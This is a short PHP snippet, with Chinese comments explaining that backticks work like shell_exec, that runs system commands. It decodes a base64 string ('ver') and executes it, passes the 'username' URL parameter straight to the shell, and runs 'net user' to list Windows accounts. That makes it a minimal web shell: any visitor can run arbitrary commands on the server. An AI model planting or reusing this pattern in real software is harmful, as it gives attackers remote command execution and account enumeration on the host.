<?php 
$cmd =base64_decode('dmVy='); // ver
echo `$cmd`. `$_GET[username]`;  // ``反引号的作用相当于shell_exec,执行系统命令
//或
$var = `net user`;
echo "$var";
?>
